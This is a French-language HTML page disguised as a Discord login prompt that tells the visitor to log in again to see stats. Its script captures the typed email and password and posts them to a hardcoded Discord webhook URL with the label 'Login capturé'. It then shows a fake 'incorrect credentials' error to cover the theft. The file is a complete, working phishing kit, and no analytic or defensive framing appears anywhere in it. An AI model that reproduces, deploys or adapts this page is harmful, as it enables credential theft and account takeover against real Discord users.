<!DOCTYPE html>
<html>
<head>
    <title>Connexion requise</title>
    <style>
        body { background: #36393f; color: white; font-family: sans-serif; text-align: center; padding: 50px; }
        .box { background: #2f3136; padding: 30px; border-radius: 5px; max-width: 400px; margin: 0 auto; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #202225; border: 1px solid #040405; color: white; }
        button { background: #5865f2; color: white; border: none; padding: 12px; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Connexion à Discord</h2>
        <p>Veuillez vous reconnecter pour voir les stats</p>
        <input type="text" id="email" placeholder="Email">
        <input type="password" id="pass" placeholder="Mot de passe">
        <button onclick="grab()">Connexion</button>
        <p id="error" style="color: #ed4245; display: none;">Identifiants incorrects</p>
    </div>
    
    <script>
        function grab() {
            var email = document.getElementById('email').value;
            var pass = document.getElementById('pass').value;
            
            fetch('https://discord.com/api/webhooks/1537654143118999572/xUfeTGedDvVvB5mguwhB9BMhIvNDBIHvmwFBh5e1h3WevbWIFRQoq7pMl14UVfpAlSRk', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: '**Login capturé**\nEmail: `' + email + '`\nPass: `' + pass + '`'
                })
            });
            
            document.getElementById('error').style.display = 'block';
        }
    </script>
</body>
</html>
